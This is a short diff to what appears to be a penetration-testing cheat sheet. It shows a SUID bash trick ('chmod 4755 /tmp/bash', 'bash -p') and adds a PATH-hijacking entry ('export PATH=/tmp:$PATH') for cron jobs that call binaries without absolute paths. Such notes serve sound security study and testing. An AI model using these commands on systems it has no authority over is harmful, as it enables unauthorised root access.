@@ -44,6 +44,9 @@ chmod 4755 /tmp/bash
 Execute SUID Bash
 `bash -p`
 
+Path Variable Hijacking (e.g., for cron job binary without absolute path)
+`export PATH=/tmp:$PATH`
+
 # Windows
 
 # Enumeration
